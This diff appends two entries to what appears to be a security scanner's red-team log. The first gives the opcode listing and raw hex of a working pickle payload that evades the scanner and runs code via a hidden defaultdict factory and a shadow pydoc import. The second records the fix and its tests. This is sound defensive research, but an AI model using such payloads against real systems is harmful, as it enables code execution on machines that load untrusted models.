@@ -13722,3 +13722,214 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3737 passed, 1022 skipped, 21 warnings in 54.47s`.
+
+## Turn 231 - Bypass via `defaultdict` default-factory callback
+
+Found a scanner-clean RCE-capable bypass in callback-bearing container state.
+The payload constructs a `_sitebuiltins._Helper` instance, stores it as the
+`default_factory` of a `collections.defaultdict`, then invokes
+`operator.getitem(defaultdict, "missing")`. Looking up a missing key calls the
+hidden default factory with zero arguments, entering `_Helper.__call__()`,
+which performs a function-body `import pydoc`. A shadow `pydoc.py` at the front
+of `sys.path` executes during `pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL _sitebuiltins _Helper
+EMPTY_TUPLE
+REDUCE              # construct _Helper()
+MEMOIZE
+POP
+STACK_GLOBAL collections defaultdict
+BINGET 0
+TUPLE1
+REDUCE              # defaultdict(_Helper())
+MEMOIZE
+POP
+STACK_GLOBAL operator getitem
+BINGET 1
+SHORT_BINUNICODE "missing"
+TUPLE2
+REDUCE              # defaultdict["missing"] calls default_factory()
+STOP
+```
+
+Raw payload:
+
+```text
+80048c0d5f736974656275696c74696e738c075f48656c70657293295294308c0b636f6c6c656374696f6e738c0b64656661756c7464696374936800855294308c086f70657261746f728c076765746974656d9368018c076d697373696e6786522e
+```
+
+Scanner proof:
+
+```text
+payload_len 98
+scan clean complete findings 0 errors ()
+import_refs (
+  {'module': '_sitebuiltins', 'name': '_Helper',
+   'import_reference': '_sitebuiltins._Helper', 'is_dangerous': False},
+  {'module': 'collections', 'name': 'defaultdict',
+   'import_reference': 'collections.defaultdict', 'is_dangerous': False},
+  {'module': 'operator', 'name': 'getitem',
+   'import_reference': 'operator.getitem', 'is_dangerous': False},
+)
+callable_invocations (
+  {'module': '_sitebuiltins', 'name': '_Helper',
+   'opcode_position': 28, 'positional_arg_count': 0},
+  {'module': 'collections', 'name': 'defaultdict',
+   'opcode_position': 61, 'positional_arg_count': 1},
+  {'module': 'operator', 'name': 'getitem',
+   'opcode_position': 96, 'positional_arg_count': 2},
+)
+actual_dangerous ()
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime stdout
+result 'factory-value'
+marker_exists True
+marker_text pydoc-owned
+
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `pydoc` from `sys.modules`, and ran `pickle.loads(payload)`.
+The shadow `pydoc.py` wrote the marker at import time and exposed
+`help()` returning `"factory-value"`, which became the result of the missing-key
+lookup.
+
+Why it bypasses:
+
+- Native policy does not mark `_sitebuiltins._Helper`,
+  `collections.defaultdict`, or `operator.getitem` as dangerous.
+- Turn 230 tracks callable iterators, but this payload hides the callback in a
+  container field (`default_factory`) rather than an iterator state.
+- The native stack model records the `defaultdict` constructor and the
+  `operator.getitem` call independently, but does not preserve that the
+  constructed dict carries a callable factory.
+- The call graph already catches `_sitebuiltins._Helper.__call__` reaching
+  `builtins.__import__` when that method is named, but no invocation metadata
+  names it here.
+- The payload contains no `__call__`, `help`, or `pydoc` literal.
+
+Likely source-level defense:
+
+- Extend the native stack model with a finite `DefaultDict` value for
+  `collections.defaultdict(factory)` when the factory is a tracked global or
+  constructed callable.
+- When `operator.getitem` is invoked on that tracked `DefaultDict`, emit a
+  zero-argument invocation for the stored factory. For precise behavior, keep
+  the check to lookups where the key is not known to already exist in the
+  tracked container.
+- Normalize constructed callable factories to `Class.__call__`, matching the
+  direct callable and call-iterator defenses.
+- Keep this source-level rather than package-specific: callback-bearing
+  containers are finite, while the factories they can hide are unbounded.
+
+Performance note:
+
+- Payload size is 98 bytes.
+- Warm scan median over 100 runs was `0.000063s` with max `0.000073s`.
+- A fix can be stack-local and constant-time over the already-modeled
+  `defaultdict` constructor arguments and `operator.getitem` operands.
+
+## Turn 232 - Defense for `defaultdict` default-factory callbacks
+
+Implemented the source-level block for Turn 231 in the native stack model. The
+scanner now preserves a tracked callable stored in
+`collections.defaultdict(factory)` as a callback-bearing `DefaultDict` stack
+value. Creating the default dict alone remains clean. When a later reducer
+invokes `operator.getitem(defaultdict, key)`, the native metadata emits an
+additional zero-argument invocation for the stored default factory, allowing the
+existing Python call graph to catch `_sitebuiltins._Helper.__call__` reaching
+`builtins.__import__`.
+
+Fix details:
+
+- Added `StackValue::DefaultDict { default_factory }` to retain the hidden
+  callable target carried by an empty `defaultdict`.
+- `push_reducer_result()` now recognizes `collections.defaultdict` with exactly
+  one tracked callable argument and stores the callback-bearing container.
+- Constructed callable factories are normalized to `Class.__call__`, matching
+  direct callable and call-iterator defenses.
+- `operator.getitem` on a tracked `DefaultDict` emits a synthetic zero-arg
+  callable invocation at the `getitem` opcode position.
+- Populated `defaultdict` constructor forms are intentionally left opaque for
+  now, preserving precision around whether a key is actually missing.
+
+Regression coverage:
+
+- `test_scan_bytes_blocks_defaultdict_factory_getitem_rce` verifies that
+  constructing `defaultdict(_Helper())` is clean until a missing-key
+  `operator.getitem` consumes the factory.
+- The malicious case verifies `_sitebuiltins._Helper.__call__` appears in
+  callable invocation metadata with zero positional arguments.
+- The test executes the payload in a child interpreter with a shadow `pydoc.py`
+  returning `"factory-value"`.
+
+Post-fix proof:
+
+```text
+payload_len 98
+factory_only_scan clean complete findings 0
+scan malicious complete findings 1
+callable_invocations (
+  {'module': '_sitebuiltins', 'name': '_Helper',
+   'opcode_position': 28, 'positional_arg_count': 0},
+  {'module': 'collections', 'name': 'defaultdict',
+   'opcode_position': 61, 'positional_arg_count': 1},
+  {'module': 'operator', 'name': 'getitem',
+   'opcode_position': 96, 'positional_arg_count': 2},
+  {'module': '_sitebuiltins', 'name': '_Helper.__call__',
+   'opcode_position': 96, 'positional_arg_count': 0},
+)
+call_graph [{'module': '_sitebuiltins',
+  'name': '_Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__',
+                'builtins.__import__')}]
+dangerous (CallGraphFinding(module='_sitebuiltins',
+  name='_Helper.__call__', sink='builtins.__import__'),)
+runtime rc 0
+runtime stdout
+result 'factory-value'
+marker_exists True
+marker_text pydoc-owned
+runtime stderr
+warm_median 0.000130
+warm_max 0.000321
+```
+
+Performance note:
+
+- The new stack value is only created for `defaultdict` reducer calls with
+  exactly one tracked callable argument.
+- The hidden callback check is stack-local and only inspects the two
+  already-modeled `operator.getitem` operands.
+- Warm scan median for the fixed 98-byte payload was `0.000130s` over 100
+  runs.
+
+Validation:
+
+- Rust formatting: `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused `defaultdict` regression: `1 passed in 0.33s`.
+- Focused import/call-graph regression file: `23 passed in 0.98s`.
+- Focused call-graph suite: `61 passed in 2.79s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  1.35s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3738 passed, 1022 skipped, 21 warnings in 52.04s`.
